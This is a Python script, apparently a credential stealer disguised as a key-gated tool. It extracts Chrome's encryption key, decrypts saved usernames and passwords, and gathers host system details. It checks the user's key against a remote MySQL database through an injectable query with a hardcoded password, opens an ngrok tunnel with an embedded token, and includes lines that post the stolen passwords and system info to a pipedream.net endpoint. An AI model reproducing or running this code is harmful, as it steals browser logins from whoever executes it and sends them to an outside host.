# @gq4022

import requests
from pyngrok import ngrok
import random
import json
import sys
import colorama
import os
import pymysql
import io
import ctypes
import pyfiglet
from time import sleep
from colorama import Fore, init
from requests import get, post
import http.client
import platform,socket,re,uuid,json,psutil,logging
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

init()

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

    key = key[5:]
    
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def getpwd():
    key = get_encryption_key()

    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")

    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

    v = {}
    i = 0
    
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5] 
        
        if username or password:
            v["OriginURL"+str(i)] = str(origin_url)
            v["ActionURL"+str(i)] = str(action_url)
            v["Username"+str(i)] = str(username)
            v["Password"+str(i)] = str(password) 
        else:
            continue
            
        if date_created != 86400000000 and date_created:
            v["Creationdate"+str(i)] = str(get_chrome_datetime(date_created))
            
        if date_last_used != 86400000000 and date_last_used:
            v["LastUsed"+str(i)] = str(get_chrome_datetime(date_last_used))
            i += 1
            
    return json.dumps(v)
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

def getSystemInfo():
    try:
        info = {}
        info['platform'] = platform.system()
        info['platform-release'] = platform.release()
        info['platform-version'] = platform.version()
        info['architecture'] = platform.machine()
        info['hostname'] = socket.gethostname()
        info['ip-address'] = socket.gethostbyname(socket.gethostname())
        info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['processor']=platform.processor()
        info['ram'] = str(round(psutil.virtual_memory().total / (1024.0 **3))) + " GB"
        return json.dumps(info)
    except Exception as e:
        logging.exception(e)

connection = pymysql.connect(
    user='toronto', 
    passwd='Kaka123.', 
    host='mysql-toronto.alwaysdata.net', 
    database='toronto_apache'
    )

key = input("Key: ")
cursor = connection.cursor()
query = ("SELECT * FROM keys_access WHERE key_access = (" + key + ")")
cursor.execute(query)
connect = [str(i) for i in cursor]

if connect:
    ngrok.set_auth_token("1vLyqxI4ixVT57xifa7iSNpf4AY_XtrgV5h6M38QepW4747u")

    ngrok_tunnel1 = ngrok.connect()
    #systeminfo = post("https://en5z21nrnpt2jmi.m.pipedream.net", data=json.loads(getSystemInfo()))
    #pwds = post("https://en5z21nrnpt2jmi.m.pipedream.net", data=json.loads(getpwd()))
